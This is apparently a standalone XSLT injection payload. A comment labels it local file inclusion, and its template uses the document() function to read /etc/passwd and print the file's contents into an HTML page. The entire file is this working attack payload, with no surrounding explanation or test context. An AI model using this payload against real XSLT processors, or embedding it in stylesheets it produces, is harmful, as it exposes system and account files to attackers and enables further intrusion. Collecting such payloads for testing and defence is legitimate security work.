<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <!-- LFI via document() function - reads local files -->
  <xsl:template match="/">
    <html>
      <body>
        <h1>File Contents:</h1>
        <pre>
          <xsl:copy-of select="document('/etc/passwd')"/>
        </pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
